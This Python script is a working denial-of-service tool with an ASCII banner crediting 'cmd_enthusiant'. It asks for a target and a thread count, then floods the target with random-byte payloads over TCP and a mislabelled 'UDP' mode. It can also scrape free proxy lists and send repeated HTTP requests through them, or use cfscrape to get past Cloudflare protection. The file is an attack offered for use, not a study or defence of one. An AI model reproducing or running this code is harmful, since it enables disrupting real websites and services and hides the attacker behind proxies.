#code by cmdenthusiant
import time
import random
import sys
import threading
import cfscrape
import requests
import socket
def start():
    print("""
                                                                  .dmmm-                               
         .:+s:                                 `-/oo              .MMMM:                               
        `NMMM+                                 oMMMm              .MMMM:                               
      .syMMMMdss:   `:oyhhhs/`    `/syhhhyo` +sdMMMNsss`   -oyhhy+:MMMM:    `:oyhhhys/.     ./syhhhyo  
      -NNMMMMMNNo  /mMMNhhmMMN/  /NMMNdhhmm. hNMMMMMNNm` .hMMMMNNNNMMMM:   +mMMMNmNMMMNy`  +NMMNdhdmm` 
       ``MMMM+``  +MMMd.  `hMMM- dMMMy`   `  ``sMMMm``` `dMMMh-  .yMMMM:  oMMMN/`  -dMMMd  NMMMs`   `  
        `MMMM/    mMMMmhhhhmMMM+ /NMMMMmho-    oMMMm    :MMMM.    .NMMM: `mMMMo     :MMMM- +NMMMMmy+.  
        `MMMM/    mMMMdssssssss:  `/shmMMMMs   oMMMm    /MMMM.    .NMMM: `mMMMo     :MMMN.  `/shNMMMMo 
         NMMMy``` oMMMm:`   `:`  :.    +MMMm`  +MMMN:`. `mMMMh-``:dMMMM:  +MMMN+.``:mMMMy  :.    oMMMd 
         oMMMMMMs  +mMMMNNmNMM:  dMNmmmMMMm:   .mMMMMNN` -dMMMMMMMdMMMM:   /mMMMMNMMMMm+   NMNmmmMMMm- 
          -osyys-   `:osyyyso:`  :osyyys+:`     `/syys+   `:osyso-`+ooo.    `-+syyys+-`    /osyyys+-`\n""")
    print("                                     code by cmd_enthusiant")
    print("                                      idea from Gogozin\n")

start()
senddos = random._urandom(2500)
attack_target = str(input("\ntarget ip(if you use cloudflare bypass or proxy pls use url):"))
port = int(input("port(default=80):"))
thr = int(input("thread(up to 880):"))
checked = 0
if thr >= 880:
    print("error: thread is up to 880")
    sys.exit()
proxydos = str(input("use proxy_dos mode?(if you use cloudflare choose 'n')(y/n)"))
bypass = str(input("use cloudflare bypass(if you use proxy_dos mode choose 'n')(y/n):"))
def check_proxy(checkline):
    global proxies
    global checked
    proxy = checkline.strip().split(":")
    testproxy = random._urandom(100)
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect((str(proxy[0]), int(proxy[1])))
        s.send(str.encode("GET / HTTP/1.1\r\nHost: " + attack_target + ":" + str(port)))
        s.close()
    except:
        proxies.remove(checkline)
    checked += 1
if proxydos == "y" or bypass == "y":
    getproxy = str(input("do you want to get new proxies list?(y/n):"))
    if getproxy == "y":
        proxyget = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=1000")
        with open("proxy.txt", "wb") as proxywrite:
            proxywrite.write(proxyget.content)
            print("successfully get proxy list!")
            time.sleep(0.1)
            proxytxtlines = open("proxy.txt").readlines()
    global proxies
    proxies = open("proxy.txt").readlines()
    print("proxy count " + str(len(proxies)))
    useproxycheck = str(input("do you want to check proxies?(y/n)"))
    if useproxycheck == "y":
        for checkline in list(proxies):
            th = threading.Thread(target=check_proxy,args=(checkline,))
            th.start()
            time.sleep(0.03)
            sys.stdout.write("checked " + str(checked) + " proxies\r")
        print("\nchecked all proxies. working:" + str(len(proxies)))
    input("please press enter to continue...")

class atk:
    def tcpdos():
        time.sleep(3)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((attack_target, port))
                s.send(senddos)
                print("successfully send data to [ %s ], type: TCP"%(attack_target))
                s.close()
            except:
                print("can't send data!")
                s.close()
    def udpdos():
        time.sleep(3)
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((attack_target, port))
                s.sendto(senddos, (attack_target, port))
                print("successfully send data to [ %s ], type: UDP"%(attack_target))
                s.close()
            except:
                print("can't send data!")
                s.close()
    def proxyrequestdos():
        time.sleep(3)
        proxy = random.choice(proxies).strip().split(":")
        s = requests.session()
        s.proxies = {}
        s.proxies['http'] = "http://" + str(proxy[0]) + ":" + str(proxy[1])
        s.proxies['https'] = "https://" + str(proxy[0]) + ":" + str(proxy[1])
        while True:
            try:
                s.get(attack_target)
                print("successfully send request to -> " + attack_target + " from~ [ " + str(proxy[0]) + ":" + str(proxy[1]) + " ]")
                try:
                    for i in range(70):
                        s.get(attack_target)
                        print("successfully send request to -> " + attack_target + " from~ [ " + str(proxy[0]) + ":" + str(proxy[1]) + " ]")
                    s.close()
                except:
                    s.close()
            except:
                print("can't send request!")
                s.close()
    def bypassdos():
        time.sleep(3)
        s = cfscrape.create_scraper()
        prox = random.choice(proxies).strip().split(":")
        s.proxies = {}
        s.proxies['http'] = "http://" + str(prox[0]) + ":" + str(prox[1])
        s.proxies['https'] = "https://" + str(prox[0]) + ":" + str(prox[1])
        while True:
            try:
                s.get(attack_target)
                print("successfully bypass cloudflare to [ %s ]"%(attack_target))
                try:
                    for i in range(70):
                        s.get(attack_target)
                        print("successfully bypass cloudflare to [ %s ]"%(attack_target))
                    s.close()
                except:
                    s.close()
            except:
                print("error bypass cloudflare...")
                s.close()

if bypass == "y" :
    for i in range(thr):
        x = threading.Thread(target=atk.bypassdos)
        x.start()
        print("thread " + str(i + 1) + " was created")
    print("wait for a second to start dos")
elif proxydos == "y":
    for i in range(thr):
        x = threading.Thread(target=atk.proxyrequestdos)
        x.start()
        print("thread " + str(i + 1) + " was created")
else:
    dostype = str(input("type(tcp / udp):"))
    input("please press enter to continue...")
    if dostype == "tcp":
        for i in range(thr):
            x = threading.Thread(target=atk.tcpdos)
            x.start()
            print("thread " + str(i + 1) + " was created")
    if dostype == "udp":
        for i in range(thr):
            x = threading.Thread(target=atk.udpdos)
            x.start()
            print("thread " + str(i + 1) + " was created")
    print("wait for a second to start dos")